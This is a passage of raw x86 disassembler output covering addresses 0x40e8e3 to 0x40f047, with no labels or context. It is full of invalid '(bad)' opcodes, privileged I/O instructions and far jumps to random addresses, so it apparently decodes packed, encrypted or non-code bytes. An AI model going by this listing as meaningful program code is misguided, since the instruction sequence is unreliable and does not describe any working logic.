  40e8e3:	mov    eax,0x6c4cbcbd
  40e8e8:	mov    al,0xad
  40e8ea:	push   cs
  40e8eb:	imul   ebp,DWORD PTR [ebp+0x1c],0x7e
  40e8ef:	add    DWORD PTR ds:0x3972ba68,0x60
  40e8f6:	hlt    
  40e8f7:	xchg   esi,eax
  40e8f8:	(bad)  
  40e8f9:	(bad)  
  40e8fa:	xor    eax,0x621e68c1
  40e8ff:	sbb    BYTE PTR [ebx],0xb5
  40e902:	iret   
  40e903:	mov    ah,0x69
  40e905:	(bad)  
  40e906:	mov    dh,0x95
  40e908:	outs   dx,BYTE PTR ds:[esi]
  40e909:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e90a:	xor    eax,0x20461147
  40e90f:	pop    edx
  40e910:	aas    
  40e911:	in     eax,0x1
  40e913:	mov    eax,0x4928e300
  40e918:	mov    ebx,esi
  40e91a:	daa    
  40e91b:	adc    al,0x27
  40e91d:	mov    dh,0x4e
  40e91f:	sbb    al,0xa4
  40e921:	push   ebp
  40e922:	dec    eax
  40e923:	fld    TBYTE PTR [edx+0x60]
  40e926:	sub    al,0x66
  40e928:	adc    eax,0x690b8abe
  40e92d:	mov    al,0x26
  40e92f:	mov    bl,0x7
  40e931:	(bad)  
  40e932:	in     eax,dx
  40e933:	(bad)  
  40e934:	jle    0x40e99f
  40e936:	call   0x49d8:0x243a3345
  40e93d:	cdq    
  40e93e:	dec    edi
  40e93f:	push   ecx
  40e940:	jbe    0x40e8e6
  40e942:	xor    eax,0xe676c2a7
  40e947:	sub    eax,0x31075be3
  40e94c:	jo     0x40e9a7
  40e94e:	scas   eax,DWORD PTR es:[edi]
  40e94f:	sbb    cl,BYTE PTR [edi]
  40e951:	pop    ds
  40e952:	test   al,0x28
  40e954:	xor    al,0x14
  40e956:	pop    eax
  40e957:	outs   dx,BYTE PTR ds:[esi]
  40e958:	ret    0x4ffb
  40e95b:	pop    eax
  40e95c:	retf   0xd090
  40e95f:	xchg   edx,eax
  40e960:	mov    ds:0xc2d42913,eax
  40e965:	dec    esi
  40e966:	nop
  40e967:	rcl    BYTE PTR [edi+0x5c710ff7],1
  40e96d:	scas   al,BYTE PTR es:[edi]
  40e96e:	out    0x28,al
  40e970:	push   0x45
  40e972:	mov    esp,0xe02c0762
  40e977:	push   0xffffffa4
  40e979:	mov    esi,0xd9272e87
  40e97e:	or     al,0xf8
  40e980:	sub    DWORD PTR [esi+0xad45910],edi
  40e986:	lods   al,BYTE PTR ds:[esi]
  40e987:	dec    esi
  40e988:	ror    DWORD PTR ds:0x85c8625d,0xb
  40e98f:	out    0xf8,eax
  40e991:	mov    cs,edx
  40e993:	dec    ebp
  40e994:	je     0x40e979
  40e996:	scas   eax,DWORD PTR es:[edi]
  40e997:	enter  0x85fd,0x5f
  40e99b:	push   edi
  40e99c:	add    BYTE PTR [esi+0x6c4493ba],ch
  40e9a2:	or     al,0xb6
  40e9a4:	ja     0x40ea07
  40e9a6:	add    dh,BYTE PTR [edi]
  40e9a8:	ror    esp,0x24
  40e9ab:	xchg   edi,eax
  40e9ac:	add    al,0x8f
  40e9ae:	add    eax,DWORD PTR [edx+0x42]
  40e9b1:	mov    esp,0xd9e7ce70
  40e9b6:	sub    dh,BYTE PTR [ecx+0x7d9999e7]
  40e9bc:	inc    esi
  40e9bd:	mov    ebx,0x2629a022
  40e9c2:	pop    es
  40e9c3:	sub    eax,0x8d0690c6
  40e9c8:	add    edx,DWORD PTR [edx]
  40e9ca:	cmc    
  40e9cb:	retf   
  40e9cc:	mov    WORD PTR [ebp-0x74],es
  40e9cf:	bound  eax,QWORD PTR [edx+0x30]
  40e9d2:	jl     0x40e990
  40e9d4:	push   0x83bb666f
  40e9d9:	xchg   ebp,eax
  40e9da:	std    
  40e9db:	inc    esp
  40e9dc:	jne    0x40ea2c
  40e9de:	mov    cl,0x40
  40e9e0:	push   edi
  40e9e1:	cli    
  40e9e2:	fist   WORD PTR [edi+ecx*8]
  40e9e5:	and    DWORD PTR ds:[esi+0xf35f696],esp
  40e9ec:	shl    ebp,1
  40e9ee:	lea    esp,[eax+0x24c7b832]
  40e9f4:	loop   0x40e979
  40e9f6:	call   0x777f:0x617734ae
  40e9fd:	push   edi
  40e9fe:	xchg   DWORD PTR [ebx+edi*4],ebx
  40ea01:	daa    
  40ea02:	mov    eax,ds:0xcd7e753f
  40ea07:	jmp    0x2412bbfc
  40ea0c:	pop    ebx
  40ea0d:	imul   esp,DWORD PTR [esi+0x723903ee],0x2337d96e
  40ea17:	ds sbb al,0xe
  40ea1a:	dec    esp
  40ea1b:	xor    al,0x2a
  40ea1d:	test   DWORD PTR [ebx+0x3e],esi
  40ea20:	loope  0x40e9e4
  40ea22:	test   bl,ah
  40ea24:	add    bl,BYTE PTR [edi]
  40ea26:	repnz cli 
  40ea28:	mov    eax,ds:0xb47593a
  40ea2d:	(bad)  
  40ea2e:	pop    ds
  40ea2f:	push   ebx
  40ea30:	inc    esi
  40ea31:	xchg   ebx,eax
  40ea32:	cmp    BYTE PTR [esi+0x93be27d],ch
  40ea38:	scas   eax,DWORD PTR es:[edi]
  40ea39:	data16 jg 0x40e9ee
  40ea3c:	mov    BYTE PTR [eax+0x72],ch
  40ea3f:	in     al,0xb5
  40ea41:	push   ss
  40ea42:	inc    edx
  40ea43:	xchg   BYTE PTR [esi],cl
  40ea45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea46:	sbb    ecx,ecx
  40ea48:	push   ds
  40ea49:	mov    ah,0x7a
  40ea4b:	xlat   BYTE PTR ds:[ebx]
  40ea4c:	dec    eax
  40ea4d:	(bad)  
  40ea4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea50:	imul   ebp,DWORD PTR [esi-0x5d28645e],0x14a20b24
  40ea5a:	pop    esi
  40ea5b:	sahf   
  40ea5c:	sub    DWORD PTR [edi+0x257d6a04],ecx
  40ea62:	test   eax,0x205be58e
  40ea67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea68:	mov    esi,0x3a96059b
  40ea6d:	shl    BYTE PTR [ebx+0x42b5ac96],1
  40ea73:	test   al,0x68
  40ea75:	adc    esp,ebx
  40ea77:	inc    eax
  40ea78:	inc    esi
  40ea79:	push   ebp
  40ea7a:	jnp    0x40ea2a
  40ea7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea7d:	xor    DWORD PTR [ecx+0x3c],edi
  40ea80:	inc    edi
  40ea81:	es dec edi
  40ea83:	mov    ds:0x8f303b95,al
  40ea88:	mov    bh,0x7a
  40ea8a:	enter  0xd822,0xe
  40ea8e:	out    0xb0,al
  40ea90:	push   ss
  40ea91:	std    
  40ea92:	imul   ebx,DWORD PTR [eax+0x68f28603],0xd
  40ea99:	dec    edi
  40ea9a:	push   ss
  40ea9b:	loopne 0x40eb1b
  40ea9d:	mov    esi,0xff82d5e1
  40eaa2:	sar    DWORD PTR [ebx-0x7b],1
  40eaa5:	xchg   esp,eax
  40eaa6:	or     edx,DWORD PTR [edx+ecx*8-0x2b]
  40eaaa:	dec    edx
  40eaab:	(bad)  
  40eaac:	repnz dec ecx
  40eaae:	sbb    ch,BYTE PTR [ebx+0x4c]
  40eab1:	mov    esp,0x2b11f7dd
  40eab6:	pop    ebp
  40eab7:	and    al,0x2c
  40eab9:	and    eax,0x4d0d6616
  40eabe:	dec    ebx
  40eabf:	inc    ebp
  40eac0:	jmp    0x872d2f39
  40eac5:	sbb    eax,0xeb81c499
  40eaca:	lods   al,BYTE PTR ds:[esi]
  40eacb:	xchg   ebx,eax
  40eacc:	cli    
  40eacd:	dec    esi
  40eace:	xchg   esp,eax
  40eacf:	(bad)  
  40ead0:	lds    esi,FWORD PTR [ecx]
  40ead2:	daa    
  40ead3:	cmp    BYTE PTR [ebx],ah
  40ead5:	push   eax
  40ead6:	(bad)  
  40ead7:	dec    ecx
  40ead8:	cmp    BYTE PTR [ecx-0x488efb6f],ah
  40eade:	(bad)  
  40eadf:	push   edx
  40eae0:	push   ds
  40eae1:	rcr    DWORD PTR [ecx],cl
  40eae3:	adc    BYTE PTR [ebx+0x2a],dh
  40eae6:	dec    BYTE PTR [esi-0x4b528e07]
  40eaec:	ins    DWORD PTR es:[edi],dx
  40eaed:	int3   
  40eaee:	lahf   
  40eaef:	xchg   ecx,eax
  40eaf0:	pop    edi
  40eaf1:	push   0xffffffd8
  40eaf3:	xchg   DWORD PTR [ebx-0xb],edi
  40eaf6:	stos   BYTE PTR es:[edi],al
  40eaf7:	sbb    eax,0x637caabd
  40eafc:	and    al,0x3a
  40eafe:	iret   
  40eaff:	cmp    esp,ebx
  40eb01:	and    ebp,DWORD PTR [edx+0x50dee6c8]
  40eb07:	xor    DWORD PTR [ebp+ebp*4+0x39],0xf50a4b6d
  40eb0f:	mov    edi,0xbab1f883
  40eb14:	imul   edx,DWORD PTR [ecx-0x78],0xf972e73c
  40eb1b:	jbe    0x40eb11
  40eb1d:	add    eax,0xcc07e5d2
  40eb22:	bound  ecx,QWORD PTR [esi+0x62]
  40eb25:	int3   
  40eb26:	mov    esp,0x61081c59
  40eb2b:	fld    TBYTE PTR [esi+0x75562e24]
  40eb31:	int    0xf9
  40eb33:	mov    eax,ebp
  40eb35:	xchg   ebp,eax
  40eb36:	add    BYTE PTR [edx-0x76],0xf4
  40eb3a:	in     al,0xad
  40eb3c:	neg    ebp
  40eb3e:	or     BYTE PTR [ecx],0xf8
  40eb41:	push   ebp
  40eb42:	pop    ebx
  40eb43:	mov    ch,0x5a
  40eb46:	push   eax
  40eb47:	dec    esi
  40eb48:	pusha  
  40eb49:	jecxz  0x40eb7b
  40eb4b:	out    dx,eax
  40eb4c:	push   ss
  40eb4d:	add    al,BYTE PTR [ebp-0x23]
  40eb50:	xor    al,0x15
  40eb52:	cmp    DWORD PTR [eax-0x7b1b3b16],0xfffffff9
  40eb59:	sub    ebp,DWORD PTR [edx+0x5a]
  40eb5c:	into   
  40eb5d:	fidiv  DWORD PTR ds:0xa3caded4
  40eb63:	pop    ss
  40eb64:	xchg   edi,eax
  40eb65:	push   0xffffffcc
  40eb67:	xchg   ecx,eax
  40eb68:	daa    
  40eb69:	sahf   
  40eb6a:	mov    ah,0xc0
  40eb6c:	push   edi
  40eb6d:	sahf   
  40eb6e:	jbe    0x40eb84
  40eb70:	dec    esp
  40eb71:	ffreep st(2)
  40eb73:	cwde   
  40eb74:	stos   BYTE PTR es:[edi],al
  40eb75:	test   DWORD PTR [ebx],0x229a43c3
  40eb7b:	xchg   DWORD PTR [ebx],ecx
  40eb7d:	ficomp WORD PTR [esi+0x55606a89]
  40eb83:	mov    ecx,0x1fe1d61e
  40eb88:	jns    0x40eb16
  40eb8a:	retf   0x7f6e
  40eb8d:	int    0xa3
  40eb8f:	ror    DWORD PTR [esi+0x4],0x58
  40eb93:	mov    ds:0x33f8b801,eax
  40eb98:	xlat   BYTE PTR ds:[ebx]
  40eb99:	pop    esi
  40eb9a:	(bad)  
  40eb9b:	data16 and ch,0x13
  40eb9f:	addr16 xchg edi,eax
  40eba1:	pop    ss
  40eba2:	pop    esi
  40eba3:	dec    edx
  40eba4:	repz pusha 
  40eba6:	inc    edx
  40eba7:	push   cs
  40eba8:	dec    ebx
  40eba9:	imul   edi,DWORD PTR [ebx],0x50
  40ebac:	adc    DWORD PTR [eax-0x20],0xd
  40ebb0:	cmp    BYTE PTR [ebx],al
  40ebb2:	mov    cl,0x5a
  40ebb4:	les    ebp,FWORD PTR [esi+edi*4+0x67abb4f9]
  40ebbb:	mov    edi,0x317edc20
  40ebc0:	scas   eax,DWORD PTR es:[edi]
  40ebc1:	gs dec ebx
  40ebc3:	sub    eax,DWORD PTR [esi+edx*2-0x4e]
  40ebc7:	loop   0x40ebfa
  40ebc9:	fs (bad) 
  40ebcb:	mul    BYTE PTR [eax+0x7319b7d3]
  40ebd1:	xchg   ecx,eax
  40ebd2:	sub    al,0x58
  40ebd4:	add    al,dl
  40ebd6:	enter  0x8942,0x73
  40ebda:	sahf   
  40ebdb:	enter  0x5f7f,0x9
  40ebdf:	fs dec eax
  40ebe1:	jmp    0xdc8c:0x48e8bde8
  40ebe8:	add    al,0x1c
  40ebea:	xlat   BYTE PTR ds:[ebx]
  40ebeb:	out    dx,eax
  40ebec:	leave  
  40ebed:	into   
  40ebee:	(bad)  
  40ebef:	pop    esp
  40ebf0:	cmp    dl,BYTE PTR [edx-0x62b65c60]
  40ebf6:	stos   BYTE PTR es:[edi],al
  40ebf7:	(bad)
  40ebfb:	lock repz (bad) 
  40ebfe:	push   cs
  40ebff:	cmp    eax,edx
  40ec01:	cmp    eax,0x2efa4e8d
  40ec06:	cmp    eax,0x13e767ca
  40ec0b:	or     bh,BYTE PTR [edx]
  40ec0d:	push   esp
  40ec0e:	xchg   ebp,eax
  40ec0f:	rol    eax,0x7b
  40ec12:	lock fdivr QWORD PTR [ebp+ebx*4+0x7b]
  40ec17:	int3   
  40ec18:	clc    
  40ec19:	xchg   ebx,eax
  40ec1a:	je     0x40ec9a
  40ec1c:	fild   DWORD PTR [ebx]
  40ec1e:	shl    edx,cl
  40ec20:	jno    0x40ebac
  40ec22:	in     eax,0x6c
  40ec24:	adc    DWORD PTR [ebx+0x4991a188],eax
  40ec2a:	jmp    0xea7ac616
  40ec2f:	(bad)  
  40ec30:	lahf   
  40ec31:	ret    
  40ec32:	jo     0xa5772398
  40ec38:	aas    
  40ec39:	dec    ebp
  40ec3a:	fbld   TBYTE PTR [ecx]
  40ec3c:	mov    edx,0x742146ef
  40ec41:	jle    0x40ec5a
  40ec43:	mov    edi,0xe075340d
  40ec48:	jbe    0x40ecba
  40ec4a:	mov    eax,0xe2da2c79
  40ec4f:	adc    BYTE PTR [edx],bh
  40ec51:	mov    al,0x10
  40ec53:	enter  0x9ffa,0xe1
  40ec57:	adc    eax,0x710051a6
  40ec5c:	pop    es
  40ec5d:	dec    ebp
  40ec5e:	test   eax,0xf98574e8
  40ec63:	inc    esi
  40ec64:	(bad)  
  40ec65:	(bad)  
  40ec66:	test   eax,0xb6396da5
  40ec6b:	xor    al,BYTE PTR [edi]
  40ec6d:	jg     0x40ec44
  40ec6f:	shl    BYTE PTR [eax-0x7b684b56],0x3d
  40ec76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec77:	cmp    bl,BYTE PTR [edx+0x29f03bda]
  40ec7d:	inc    esp
  40ec7e:	in     eax,dx
  40ec7f:	dec    edx
  40ec80:	hlt    
  40ec81:	xchg   esp,eax
  40ec82:	cmp    eax,DWORD PTR [edx-0x63]
  40ec85:	retf   
  40ec86:	and    DWORD PTR [ebp+0xaa6538a],0x1906cfe3
  40ec90:	jge    0x40ece7
  40ec92:	in     al,dx
  40ec93:	stos   BYTE PTR es:[edi],al
  40ec94:	fdiv   QWORD PTR [edx+eiz*1+0x5b]
  40ec98:	dec    esi
  40ec99:	adc    BYTE PTR [edi-0x6],al
  40ec9c:	fistp  DWORD PTR [ecx+0x76]
  40ec9f:	sub    eax,0x6a9d6807
  40eca4:	pop    edx
  40eca5:	ret    0x8cbd
  40eca8:	std    
  40eca9:	sti    
  40ecaa:	sbb    edi,DWORD PTR [edi-0x4601a897]
  40ecb0:	(bad)  
  40ecb1:	lds    ebp,FWORD PTR [edx-0x76]
  40ecb4:	fwait
  40ecb5:	in     al,dx
  40ecb6:	enter  0x45fb,0x3e
  40ecba:	sub    al,0x9b
  40ecbc:	mov    bl,0x8a
  40ecbe:	int3   
  40ecbf:	jae    0x40ec6d
  40ecc1:	mov    ds:0xa38095fd,al
  40ecc6:	cld    
  40ecc7:	inc    esi
  40ecc8:	int    0xc7
  40ecca:	dec    ebx
  40eccb:	repz jb 0x40ec80
  40ecce:	push   0x44
  40ecd0:	stc    
  40ecd1:	arpl   WORD PTR [esp+ebx*8],si
  40ecd4:	xor    DWORD PTR [ebx+0x5b9a086],0xffffffa4
  40ecdb:	cmp    DWORD PTR [ebx],ecx
  40ecdd:	mov    bh,BYTE PTR [edi+0x29]
  40ece0:	xor    al,0xa
  40ece2:	jp     0x40ec9c
  40ece4:	and    ecx,ecx
  40ece6:	jl     0x40ed4a
  40ece8:	xchg   DWORD PTR [edi+0x3f],ecx
  40eceb:	inc    eax
  40ecec:	cmp    DWORD PTR [edi],edx
  40ecee:	jecxz  0x40ed37
  40ecf0:	lds    esp,FWORD PTR [ecx+eiz*8-0x7a]
  40ecf4:	mov    edi,0x638bd064
  40ecf9:	pop    edi
  40ecfa:	mov    edx,0xe3dd4d46
  40ecff:	push   es
  40ed00:	jmp    0x7cb0264b
  40ed05:	push   eax
  40ed06:	call   0x5c68c113
  40ed0b:	mov    eax,ds:0xda83e810
  40ed10:	arpl   WORD PTR [esi-0x6d],bx
  40ed13:	fs test edi,0xca8ee8aa
  40ed1a:	inc    eax
  40ed1b:	jg     0x40ecb6
  40ed1d:	jp     0x40ece2
  40ed1f:	dec    esp
  40ed20:	lock and bh,BYTE PTR [esi]
  40ed23:	das    
  40ed24:	lods   al,BYTE PTR ds:[esi]
  40ed25:	rol    bh,cl
  40ed27:	icebp  
  40ed28:	jl     0x40ed66
  40ed2a:	cwde   
  40ed2b:	fisub  DWORD PTR [ecx+0x0]
  40ed2e:	sub    esp,DWORD PTR [edi]
  40ed30:	pop    edx
  40ed31:	add    BYTE PTR [esi+ecx*2-0x19],ah
  40ed35:	mov    esp,0xb35ec61d
  40ed3a:	pop    ecx
  40ed3b:	mul    bh
  40ed3d:	pop    ecx
  40ed3e:	pusha  
  40ed3f:	clc    
  40ed40:	mov    esp,0x4847b07e
  40ed45:	mov    DWORD PTR [eax+eiz*8+0x1e],eax
  40ed49:	repz add al,0x70
  40ed4c:	loope  0x40ed25
  40ed4e:	mov    ecx,0x1bf8a4c8
  40ed53:	sbb    al,0x66
  40ed55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed56:	sub    esi,ebp
  40ed58:	dec    edx
  40ed59:	inc    DWORD PTR [eax-0x3b51f906]
  40ed5f:	sub    ch,BYTE PTR [edi-0x30]
  40ed62:	and    eax,0x18ba4e67
  40ed67:	add    dl,BYTE PTR [edi]
  40ed69:	enter  0x1a1,0x20
  40ed6d:	int3   
  40ed6e:	or     eax,0xdc65a3a7
  40ed73:	and    cl,BYTE PTR [eax-0x7b]
  40ed76:	and    BYTE PTR ds:0x3a9562a,cl
  40ed7c:	jmp    0xcc5f:0x96516452
  40ed83:	daa    
  40ed84:	and    ecx,edx
  40ed86:	in     al,0x2d
  40ed88:	loopne 0x40ed0f
  40ed8a:	adc    ebp,esi
  40ed8c:	fist   DWORD PTR [ebx-0x38]
  40ed8f:	jmp    0x40edac
  40ed91:	pop    ds
  40ed92:	clc    
  40ed93:	pushf  
  40ed94:	fcmovbe st,st(6)
  40ed96:	lea    ebx,[edi]
  40ed98:	mov    edx,0x29bca609
  40ed9d:	jae    0x40ede8
  40ed9f:	xor    al,0x85
  40eda1:	cmc    
  40eda2:	inc    edi
  40eda3:	jp     0x40edf2
  40eda5:	inc    edi
  40eda6:	ficomp WORD PTR ds:0x46d6c66c
  40edac:	mov    BYTE PTR [esi+eax*1-0x39],bl
  40edb0:	jg     0x40ed42
  40edb2:	jnp    0x40edfb
  40edb4:	packuswb mm4,mm7
  40edb7:	in     al,0x65
  40edb9:	fcmovu st,st(5)
  40edbb:	cmp    edx,DWORD PTR [edx+ebx*1+0xb]
  40edbf:	push   0x4eb263a1
  40edc4:	lods   al,BYTE PTR ds:[esi]
  40edc5:	scas   al,BYTE PTR es:[edi]
  40edc6:	sbb    eax,0x1afbfadb
  40edcb:	sbb    dh,BYTE PTR [esi]
  40edcd:	jp     0x40ed67
  40edcf:	xor    DWORD PTR [ebp+edx*4-0x208fe61c],ebx
  40edd6:	adc    eax,0xa6989b23
  40eddb:	pop    es
  40eddc:	mov    DWORD PTR [esi-0x1b],esp
  40eddf:	adc    bh,bh
  40ede1:	cli    
  40ede2:	stc    
  40ede3:	cld    
  40ede4:	xor    al,0x5b
  40ede6:	loope  0x40ee60
  40ede8:	mov    ds,WORD PTR [esi-0x30f723a2]
  40edee:	sub    BYTE PTR [eax],cl
  40edf0:	push   cs
  40edf1:	add    DWORD PTR [ebx],edi
  40edf3:	(bad)  
  40edf5:	push   ecx
  40edf6:	or     BYTE PTR [ecx-0x73f3f601],cl
  40edfc:	fisub  WORD PTR [ebp-0x5b712428]
  40ee02:	ins    BYTE PTR es:[edi],dx
  40ee03:	pop    esp
  40ee04:	das    
  40ee05:	inc    ecx
  40ee06:	test   al,0xf7
  40ee08:	cmp    eax,0x4e31821
  40ee0d:	push   eax
  40ee0e:	fucomip st,st(6)
  40ee10:	int3   
  40ee11:	jl     0x40ee2f
  40ee13:	cwde   
  40ee14:	adc    BYTE PTR [ebx-0x45],al
  40ee17:	or     DWORD PTR ds:0xe1c71b90,esp
  40ee1d:	aas    
  40ee1e:	push   ebx
  40ee1f:	dec    eax
  40ee20:	push   ebx
  40ee21:	stc    
  40ee22:	(bad)  
  40ee23:	sub    ebx,DWORD PTR [ecx]
  40ee25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee26:	es aad 0xba
  40ee29:	cmp    ebx,DWORD PTR [ebx-0x6a]
  40ee2c:	rcr    esi,1
  40ee2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee2f:	or     ebp,esi
  40ee31:	ret    0xebc7
  40ee34:	lock sbb al,0xe4
  40ee37:	sbb    DWORD PTR [esi+0x24],0xffffffc5
  40ee3b:	pop    esi
  40ee3c:	sar    DWORD PTR [edx],0xdb
  40ee3f:	xor    bh,BYTE PTR [ebx]
  40ee41:	adc    cl,BYTE PTR [ecx-0x779c2ebe]
  40ee47:	rcl    DWORD PTR [ebx-0x4925ec1d],cl
  40ee4d:	repnz inc ebp
  40ee4f:	inc    eax
  40ee50:	xchg   esi,eax
  40ee51:	add    esp,DWORD PTR [edx+0x623be1d9]
  40ee57:	iret   
  40ee58:	lahf   
  40ee59:	cmp    esi,DWORD PTR [edi+0x56bbc4dd]
  40ee5f:	mov    ecx,0x94669473
  40ee64:	int3   
  40ee65:	xchg   ebx,eax
  40ee66:	xor    DWORD PTR [edi],eax
  40ee68:	jecxz  0x40ee83
  40ee6a:	and    ch,BYTE PTR [eax]
  40ee6c:	ja     0x40ee77
  40ee6e:	cmp    edx,ebp
  40ee70:	jg     0x40ee0c
  40ee72:	mov    al,ds:0x83d8b8c0
  40ee77:	retf   0xad6e
  40ee7a:	dec    eax
  40ee7b:	imul   edi,DWORD PTR [ebp+0x2f6d5fa1],0x0
  40ee82:	leave  
  40ee83:	pop    ecx
  40ee84:	push   edi
  40ee85:	mov    ah,0xd7
  40ee87:	mov    ebp,0x515617a5
  40ee8c:	mul    DWORD PTR [ecx+0x2e9d3e4d]
  40ee92:	es retf 
  40ee94:	add    al,0x7b
  40ee96:	mov    edi,0x5a8e2774
  40ee9b:	rol    DWORD PTR [edi+0x3e],0xf9
  40ee9f:	mov    ah,0x1f
  40eea1:	mov    ah,0x62
  40eea3:	imul   edi,DWORD PTR [ecx-0x19ef0b67],0xffffffdd
  40eeaa:	and    ebp,eax
  40eeac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eead:	xchg   esp,eax
  40eeae:	add    eax,0x71dd7281
  40eeb3:	push   0x2c
  40eeb5:	retf   0x2279
  40eeb8:	cmp    al,0x68
  40eeba:	push   esp
  40eebb:	mov    bl,0x5f
  40eebd:	mov    ebx,0xbf77c76d
  40eec2:	dec    eax
  40eec3:	mov    ebx,0xb97481e7
  40eec8:	dec    ebx
  40eec9:	dec    esi
  40eeca:	push   edi
  40eecb:	fisttp DWORD PTR [ebp-0x642abc09]
  40eed1:	or     ch,BYTE PTR [eax+0x59]
  40eed4:	add    ecx,DWORD PTR [edx]
  40eed6:	mov    ebx,0x490cf8f7
  40eedb:	or     ecx,DWORD PTR ds:0x5dc95a17
  40eee1:	fimul  DWORD PTR [ebp+0x5b2e6cca]
  40eee7:	cwde   
  40eee8:	xchg   edx,eax
  40eee9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eeea:	or     ebx,DWORD PTR [eax]
  40eeec:	dec    DWORD PTR [ecx+0x63d83b24]
  40eef2:	cld    
  40eef3:	push   0xb9f658e6
  40eef8:	sub    eax,DWORD PTR [eax+0x75]
  40eefb:	add    eax,esp
  40eefd:	fsub   DWORD PTR [bx+0x66]
  40ef01:	bound  eax,QWORD PTR [esi]
  40ef03:	shl    ecx,cl
  40ef05:	imul   ecx,DWORD PTR [eax-0x2f6ac19d],0xffffffcc
  40ef0c:	and    BYTE PTR [eax-0x6f],0x49
  40ef10:	mov    esi,0xb72f42bd
  40ef15:	aam    0x37
  40ef17:	imul   edx,DWORD PTR [ebx+0x6e],0xf110ec4f
  40ef1e:	or     al,0x52
  40ef20:	aam    0xbc
  40ef22:	fild   QWORD PTR ds:0xfc023833
  40ef28:	(bad)  
  40ef29:	sub    esi,edx
  40ef2b:	into   
  40ef2c:	bound  eax,QWORD PTR [eax+0x36d98e6a]
  40ef32:	(bad)  
  40ef33:	ins    DWORD PTR es:[edi],dx
  40ef34:	sub    al,0x52
  40ef36:	into   
  40ef37:	jp     0x40eeed
  40ef39:	out    0x9b,eax
  40ef3b:	mov    fs,WORD PTR [eax+0x1581808e]
  40ef41:	xchg   edi,eax
  40ef42:	adc    DWORD PTR [edi],edx
  40ef44:	inc    ebp
  40ef45:	mov    BYTE PTR [eax+eiz*4-0x27],ch
  40ef49:	mov    ch,BYTE PTR [ebx-0x4b]
  40ef4c:	dec    edi
  40ef4d:	add    DWORD PTR [edi+edi*1],ecx
  40ef50:	adc    al,0x74
  40ef52:	add    eax,0x133145e8
  40ef57:	jno    0x40ef09
  40ef59:	xchg   BYTE PTR [ebp+0x50],bl
  40ef5c:	cmp    cl,BYTE PTR [edx+ebx*8]
  40ef5f:	daa    
  40ef60:	pop    esp
  40ef61:	add    DWORD PTR [ebx-0x3d],esi
  40ef64:	ins    DWORD PTR es:[edi],dx
  40ef65:	mov    bl,0x88
  40ef67:	addr16 ret 0x16af
  40ef6b:	push   0x7deaad89
  40ef70:	inc    edi
  40ef71:	jmp    0x40ef8d
  40ef73:	sar    DWORD PTR [ecx],1
  40ef75:	dec    eax
  40ef76:	dec    esi
  40ef77:	mov    edx,0xd16bd392
  40ef7c:	(bad)  
  40ef7d:	enter  0x2052,0x47
  40ef81:	xor    DWORD PTR cs:[edx+0x75],edi
  40ef85:	push   edi
  40ef86:	imul   eax,DWORD PTR ds:0xf0a314ea,0xffffffbf
  40ef8d:	repz adc bl,BYTE PTR [edi-0x73d83163]
  40ef94:	bound  esp,QWORD PTR [ebp-0x2c]
  40ef97:	fdivr  QWORD PTR [ebp+0x6bddf74c]
  40ef9d:	adc    eax,0xccb12751
  40efa2:	pushf  
  40efa3:	retf   
  40efa4:	mov    al,0x92
  40efa6:	xchg   ebx,ebp
  40efa8:	das    
  40efa9:	xchg   edi,eax
  40efaa:	cmp    ecx,esi
  40efac:	inc    ecx
  40efad:	sub    al,BYTE PTR [ebp-0x65]
  40efb0:	push   ds
  40efb1:	cmp    dh,cl
  40efb3:	clc    
  40efb4:	loop   0x40efef
  40efb6:	lock dec edi
  40efb8:	scas   al,BYTE PTR es:[edi]
  40efb9:	push   eax
  40efba:	cli    
  40efbb:	or     ebx,edi
  40efbd:	xchg   ebx,edi
  40efbf:	cmp    eax,0xf9cc8e3c
  40efc4:	dec    ebx
  40efc5:	inc    eax
  40efc6:	aaa    
  40efc7:	das    
  40efc8:	test   al,0xb2
  40efca:	aad    0xbe
  40efcc:	add    DWORD PTR [edi],0x8af22895
  40efd2:	jae    0x40efee
  40efd4:	cmp    eax,0xe98e7e5f
  40efd9:	not    DWORD PTR [esi-0x4b]
  40efdc:	std    
  40efdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efde:	and    ecx,DWORD PTR [ecx+eiz*8]
  40efe1:	out    dx,al
  40efe2:	(bad)
  40efe5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efe6:	lods   al,BYTE PTR ds:[esi]
  40efe7:	inc    ecx
  40efe8:	repnz out dx,al
  40efea:	mov    bl,0xe9
  40efec:	mov    dl,BYTE PTR [edx-0x8557b1a]
  40eff2:	push   ecx
  40eff3:	sub    ah,bh
  40eff5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eff6:	ins    BYTE PTR es:[edi],dx
  40eff7:	call   0x1c79:0x36f6eb9d
  40effe:	mov    edi,0x65f02a33
  40f003:	sub    eax,0x846ec937
  40f008:	lds    edi,FWORD PTR [eax+0x3d]
  40f00b:	add    DWORD PTR ss:[edx+ebx*1+0x6b],esp
  40f010:	test   al,0xf0
  40f012:	rcr    eax,cl
  40f014:	fwait
  40f015:	loopne 0x40efbb
  40f017:	inc    eax
  40f018:	push   ebp
  40f019:	xor    edi,DWORD PTR [edi+0xe]
  40f01c:	jmp    0x94a1c3ea
  40f021:	jne    0x40efc6
  40f023:	xor    BYTE PTR [edi],dl
  40f025:	(bad)  [ecx+0x4b]
  40f028:	mov    bh,0xf1
  40f02a:	lds    esp,FWORD PTR [eax]
  40f02c:	fild   QWORD PTR [esi+0x1b]
  40f02f:	xor    al,0x74
  40f031:	mov    ebp,0x4b27a19d
  40f036:	imul   eax,DWORD PTR [esi+ebx*4-0x6f78c57e],0xffffffc9
  40f03e:	(bad)
  40f041:	out    dx,eax
  40f042:	mov    DWORD PTR [esi],edx
  40f044:	pop    edx
  40f045:	(bad)  
  40f046:	xchg   esi,eax
  40f047:	add    DWORD PTR [eax],esi
